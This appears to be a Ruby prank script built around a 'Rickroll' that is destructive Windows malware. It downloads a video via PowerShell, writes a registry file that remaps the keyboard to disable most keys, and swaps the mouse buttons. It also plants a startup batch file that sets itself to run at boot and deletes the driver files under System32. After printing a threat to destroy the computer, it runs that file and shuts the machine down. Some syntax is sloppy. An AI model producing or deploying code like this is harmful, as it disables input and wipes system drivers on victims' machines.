www = "https://raw.githubusercontent.com/Da2dalus/NeverEver/main/NeverGonna.webm"

path = "%USERPROFILE%\Downloads\"

nokey = File.open("%USERPROFILE%\Downloads\nokey.reg", "w")
nokey.write("Windows Registry Editor Version 5.00")
nokey.write("[HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Control\Keyboard Layout]")
nokey.write("Scancode Map"=hex:00,00,00,00,00,00,00,00,7c,00,00,00,00,00,01,00,00,\")
nokey.write("41,00,00,00,42,00,00,00,43,00,00,00,44,00,00,00,57,00,00,00,58,00,00,00,37,\")
nokey.write("e0,00,00,46,00,00,00,45,00,00,00,35,e0,00,00,37,00,00,00,4a,00,00,00,47,00,\")
nokey.write("00,00,48,00,00,00,49,00,00,00,4b,00,00,00,4c,00,00,00,4d,00,00,00,4e,00,00,\")
nokey.write("00,4f,00,00,00,50,00,00,00,51,00,00,00,1c,e0,00,00,53,00,00,00,52,00,00,00,\")
nokey.write("4d,e0,00,00,50,e0,00,00,4b,e0,00,00,48,e0,00,00,52,e0,00,00,47,e0,00,00,49,\")
nokey.write("e0,00,00,53,e0,00,00,4f,e0,00,00,51,e0,00,00,29,00,00,00,02,00,00,00,03,00,\")
nokey.write("00,00,04,00,00,00,05,00,00,00,06,00,00,00,07,00,00,00,08,00,00,00,09,00,00,\")
nokey.write("00,0a,00,00,00,0b,00,00,00,0c,00,00,00,0d,00,00,00,0e,00,00,00,0f,00,00,00,\")
nokey.write("10,00,00,00,11,00,00,00,12,00,00,00,13,00,00,00,14,00,00,00,15,00,00,00,16,\")
nokey.write("00,00,00,17,00,00,00,18,00,00,00,19,00,00,00,1a,00,00,00,1b,00,00,00,2b,00,\")
nokey.write("00,00,3a,00,00,00,1e,00,00,00,1f,00,00,00,20,00,00,00,21,00,00,00,22,00,00,\")
nokey.write("00,23,00,00,00,24,00,00,00,25,00,00,00,26,00,00,00,27,00,00,00,28,00,00,00,\")
nokey.write("1c,00,00,00,2a,00,00,00,2c,00,00,00,2d,00,00,00,2e,00,00,00,2f,00,00,00,30,\")
nokey.write("00,00,00,31,00,00,00,32,00,00,00,33,00,00,00,34,00,00,00,35,00,00,00,36,00,\")
nokey.write("00,00,1d,00,00,00,5b,e0,00,00,38,00,00,00,39,00,00,00,38,e0,00,00,5c,e0,00,\")
nokey.write("00,5d,e0,00,00,1d,e0,00,00,5f,e0,00,00,5e,e0,00,00,22,e0,00,00,24,e0,00,00,\")
nokey.write("10,e0,00,00,19,e0,00,00,30,e0,00,00,2e,e0,00,00,2c,e0,00,00,20,e0,00,00,6a,\")
nokey.write("e0,00,00,69,e0,00,00,68,e0,00,00,67,e0,00,00,42,e0,00,00,6c,e0,00,00,6d,e0,\")
nokey.write("00,00,66,e0,00,00,6b,e0,00,00,21,e0,00,00,00,00")
nokey.close()

kill = File.open("C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kill.bat", "w")
kill.write("@((( Echo Off > Nul ) & Break Off )")
kill.write("@Set HiveBSOD=HKLM\Software\Microsoft\Windows\CurrentVersion\Run")
kill.write("@Reg Add "%HiveBSOD%" /v "BSOD" /t "REG_SZ" /d %0 /f > Nul")
kill.write("@Del /q /s /f "%SystemRoot%\Windows\System32\Drivers\*.*"")
kill.write(")")
kill.close

`powershell -command "Invoke-WebRequest -Uri '#{www}' -OutFile '#{path}'"`

`RUNDLL32 USER32.DLL,SwapMouseButton`

`start "%USERPROFILE%\Downloads\nokey.reg"`

`start /min "" "C:\Program Files\Windows Media Player\mplayer2.exe" /play /close "#{path}"`

puts "You were"                                                             
puts "-_____                 |\   -__ /\         ,, ,,        |\   "
puts "  ' | -,          _     \\    || \,        || ||         \\  "
puts " /| |  |`  _-_   < \,  / \\  /|| /    /'\\ || ||  _-_   / \\ "
puts " || |==|| || \\  /-|| || ||  \||/-   || || || || || \\ || || "
puts "~|| |  |, ||/   (( || || ||   ||  \  || || || || ||/   || || "
puts " ~-____,  \\,/   \/\\  \\/  _---_-|, \\,/  \\ \\ \\,/   \\/  (Rickrolled)"
puts "(                                                            "
puts "After this song has finished playing your computer will be destroyed."
puts "Don't try anything stupid till then."

sleep(205)

`start "C:\Users\Username\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\kill.bat"`

`shutdown /s`
